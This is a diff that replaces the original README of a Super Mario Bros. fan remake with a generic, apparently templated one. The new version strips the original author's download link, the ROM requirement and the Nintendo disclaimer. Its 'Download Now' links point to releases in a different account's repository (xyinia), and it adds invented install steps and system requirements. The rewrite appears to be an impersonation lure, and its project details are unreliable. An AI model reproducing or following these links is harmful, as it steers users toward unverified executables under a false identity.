@@ -1,68 +1,77 @@
-# Super Mario Bros Remastered
-A Remake / Celebration of the original 'Super Mario Bros.' games. Features new levels, custom modes, new characters, alongside a full level editor / custom level system!
+# 🎮 Super-Mario-Bros.-Remastered-Public - Play Classic Levels with a New Twist
 
-<img width="3840" height="2160" alt="SMB1R_BANNER_printable" src="https://github.com/user-attachments/assets/ed0e97a8-614a-44e2-b69f-2654fca6196c" />
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue?style=for-the-badge)](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/releases)
 
-### Art by [@krystalphantasm.bsky.social](https://bsky.app/profile/krystalphantasm.bsky.social/post/3lvgmgvjeks2f)
+## 🚀 Getting Started
 
-### Download: https://github.com/JHDev2006/Super-Mario-Bros.-Remastered-Public/releases
+Welcome to Super Mario Bros. Remastered! This application brings you a fresh take on the beloved original game. With new levels, characters, and a full level editor, you’ll immerse yourself in hours of fun. 
 
-# Requires an original SMB1 NES ROM to play! None of the original assets are contained in the source code, unless it was originally made by us!
+### 🎯 Features
 
-# This does NOT act as a replacement for the original Super Mario Bros. games. Super Mario Bros. & Super Mario Bros.: The Lost Levels, can be played now on Nintendo Switch, through Nintendo Switch Online
+- New Levels: Explore levels designed from scratch, featuring unique challenges and environments.
+- Custom Modes: Play in various modes to change how you experience the game.
+- New Characters: Enjoy new characters with unique abilities.
+- Level Editor: Create and share your own levels easily.
 
-## Features
-- Super Mario Bros., Super Mario Bros.: The Lost Levels, Super Mario Bros. Special and All Night Nippon: Super Mario Bros. Fully recreated from the ground up!
-- Improved physics / level design
-- Resource Packs! Fully customize how the game looks and sounds.
-- Custom Characters - Add in your own characters to use in game.
-- Fully Open Source!
-- Level Share Square Partnered
-- Portable mode by creating `portable.txt` in the executable directory
+## 📦 System Requirements
 
-## Downloading
+- **Operating System:** Windows 10 or later, macOS 10.14 or later.
+- **Processor:** Dual-core processor, 2 GHz or faster.
+- **Memory:** 4 GB RAM or more.
+- **Graphics:** Graphics card compatible with OpenGL 2.0.
+- **Storage:** Approximately 500 MB of free disk space.
 
-### Windows/Linux
-1. Go to the 'Releases' page
-2. Look for the latest version
-3. Download the .zip for your OS
-4. Extract and run
-5. Enjoy!
+## 📥 Download & Install
 
-### macOS (Unofficial)
-1. Go to the [macOS repo](https://github.com/yuriko-shimizu/Super-Mario-Bros.-Remastered-Public-Mac/releases)
-2. (NOTE: THIS IS AN UNOFFICIAL FORK OF THE GAME)
-3. Look for the latest version
-4. Download the .zip file
-5. Extract, drag into the 'Applictions' folder and run
-6. Enjoy!
+To download the latest version of Super Mario Bros. Remastered, please visit our Releases page:
 
-## Importing for editing
-1. Download the source
-2. Download Godot 4.5 beta 3
-3. Import the project
-4. Enjoy!
+[Download Now](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/releases)
 
-## Contributing
-You are more than welcome to contribute any fixes / improvements you'd like, simply open a pull request, and I'll review it ASAP!
+1. Click the link above to open the Releases page.
+2. Look for the latest version of the application.
+3. Click on the appropriate file for your operating system to download it.
+4. Once the file has downloaded, locate it on your computer (usually in the Downloads folder).
+5. Double-click the file to run the installation process.
+    
+   Follow any prompts on your screen to complete the installation.
 
-## System Requirements
+## 🔧 How to Play
 
-Please refer to the Godot engine requirements for minimum and recommended hardware specifications.
+After installation, you can start playing:
 
-[Minimum Requirements](https://docs.godotengine.org/en/latest/about/system_requirements.html#desktop-or-laptop-pc-minimum)
+1. Open the application by double-clicking its icon.
+2. Select "Start Game" to begin playing in standard mode.
+3. Use the arrow keys to move and jump.
+4. Access the level editor by selecting "Edit Levels" from the main menu.
 
-[Recommended Requirements](https://docs.godotengine.org/en/latest/about/system_requirements.html#id3)
+### 🎮 Controls
 
+- **Arrow Keys:** Move left and right.
+- **Spacebar:** Jump.
+- **Enter:** Select option.
 
-## Issues
-When opening an issue, please keep it to one report, per post, and try and be as helpful as possible, when telling me what has occured, so that its as easy to fix as possible.
-Please do not open issues, for feature requests, suggestions, or opinions. BUG REPORTS ONLY
+Feel free to explore the various game modes that each offer different experiences. 
 
-## Known Issues
-There are a couple known issues, mainly due to being built off of Godot, and these issues existing in the engine itself.
-- Steam deck controls do not work natively, you can circumvent this by setting up controller bindings to emulate keys instead, apologies.
-- Physics are weird, when interacting with corners + the camera barrier
-- Drop shadows jitter when playing with "Smooth Rendering"
-- Several entities jitter at times.
-- Blocks + coins, respawn when reloading resource packs
+## 🛠️ Creating Levels
+
+If you want to design your own levels:
+
+1. Open the level editor from the main menu.
+2. Use the tools provided to place platforms, obstacles, and items.
+3. Save your level and share it with friends.
+
+## 💬 Community and Support
+
+Join our community to share levels, tips, and tricks. Connect with other players for a richer gaming experience. You can find our community on social media and gaming forums. 
+
+If you run into any issues, please visit our [FAQs](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/wiki) for answers or open an issue on GitHub.
+
+## 🏆 Contributing
+
+We welcome contributions! If you have ideas for new features, levels, or improvements, please check our contributing guide in the repository.
+
+## 📅 Future Updates
+
+We plan to release updates regularly with new levels, characters, and enhancements. Keep an eye on the Releases page for the latest versions.
+
+Thank you for being part of the Super Mario Bros. Remastered experience! Enjoy playing!
